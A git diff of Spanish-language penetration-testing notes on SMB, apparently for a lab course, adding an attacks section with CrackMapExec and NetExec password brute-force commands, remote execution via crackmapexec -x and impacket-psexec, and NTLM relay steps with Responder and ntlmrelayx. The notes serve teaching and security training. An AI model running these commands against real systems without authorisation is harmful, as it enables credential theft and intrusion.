@@ -150,11 +150,11 @@ lookupsids S-1-5-...  # obtener usuario de un SID
 
 Podemos ver un recurso compartido desde windows dando a `CTRL + R`  para abrir el cuadro de dialogo de ejecutar y introduciendo la ruta al recurso compartido `\\dominio.local\recurso`&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
 
 En caso de no tener acceso al recurso porque no acepta usuarios anonimos o no tenemos credenciales válidas no saldra una solicitud de autenticación.
 
-<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
 
 #### Enumeración desde CMD&#x20;
 
@@ -188,19 +188,41 @@ C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
 The command completed successfully.
 ```
 
-### Riesgos y misconfiguraciones
+### Ataques
 
-| Riesgo                            | Descripción                                                                                                        |
-| --------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
-| **Null Session**                  | Acceso a SMB sin credenciales. Permite enumerar usuarios, grupos, políticas y shares.                              |
-| **Shares con permisos excesivos** | Shares accesibles a `Everyone` con permisos de lectura o escritura.                                                |
-| **SMBv1 activo**                  | Vulnerable a EternalBlue (MS17-010) → RCE sin autenticación.                                                       |
-| **NTLM Relay**                    | Con Responder + ntlmrelayx se pueden capturar hashes NTLMv2 y retransmitirlos para autenticarse en otros sistemas. |
-| **Pass-the-Hash**                 | Los hashes NTLM pueden usarse directamente para autenticarse sin conocer la contraseña.                            |
-| **Archivos sensibles en shares**  | Credenciales en scripts, archivos de configuración, backups en shares accesibles.                                  |
-| **Guest account activo**          | La cuenta Guest puede dar acceso a shares sin credenciales válidas.                                                |
+#### Brute Force
 
-#### NTLM Relay con Responder
+**Bruteforce con CrackMapExec**
+
+```bash
+crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+```
+
+**Bruteforce con Netexec**
+
+```bash
+nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+```
+
+> Usando el `--continue-on-success`  seguira el bruteforce para el resto de usuarios después de que se encuentre una contraseña válida.
+>
+> Si el ordenador no esta en dominio necesitaremos usar la opción `--local-auth`.
+
+#### Ejecucion remota de codigo
+
+**RCE con CrackMapExec**
+
+```bash
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+```
+
+**RCE con Impacket-psexec**
+
+```bash
+impacket-psexec administrator:'Password123!'@10.10.110.17
+```
+
+**NTLM Relay con Responder**
 
 ```bash
 # Paso 1: envenenar LLMNR/NBT-NS para capturar hashes
@@ -213,6 +235,18 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support
 # Con sesión interactiva
 sudo ntlmrelayx.py -tf targets.txt -smb2support -i
 ```
+
+### Riesgos y misconfiguraciones
+
+| Riesgo                            | Descripción                                                                                                        |
+| --------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
+| **Null Session**                  | Acceso a SMB sin credenciales. Permite enumerar usuarios, grupos, políticas y shares.                              |
+| **Shares con permisos excesivos** | Shares accesibles a `Everyone` con permisos de lectura o escritura.                                                |
+| **SMBv1 activo**                  | Vulnerable a EternalBlue (MS17-010) → RCE sin autenticación.                                                       |
+| **NTLM Relay**                    | Con Responder + ntlmrelayx se pueden capturar hashes NTLMv2 y retransmitirlos para autenticarse en otros sistemas. |
+| **Pass-the-Hash**                 | Los hashes NTLM pueden usarse directamente para autenticarse sin conocer la contraseña.                            |
+| **Archivos sensibles en shares**  | Credenciales en scripts, archivos de configuración, backups en shares accesibles.                                  |
+| **Guest account activo**          | La cuenta Guest puede dar acceso a shares sin credenciales válidas.                                                |
 
 > **EternalBlue (MS17-010)** afecta a sistemas Windows sin el parche MS17-010. Si SMBv1 está activo y el sistema no está parcheado, el resultado es RCE sin autenticación. Verificar siempre con `nmap --script smb-vuln-ms17-010`.
 
